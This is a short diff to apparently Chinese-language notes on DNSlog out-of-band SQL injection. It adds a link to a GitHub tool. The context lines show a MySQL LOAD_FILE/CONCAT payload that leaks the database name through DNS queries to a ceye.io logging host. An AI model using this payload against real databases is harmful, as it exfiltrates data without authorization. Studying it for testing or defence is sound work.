@@ -32,3 +32,6 @@ Dnslog平台：http://ceye.io/
 
 	核心语法： SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.r5ourp.ceye.io\\abc'));
 	sql语句不能含有特殊符号
+
+
+https://github.com/ADOOO/DnslogSqlinj
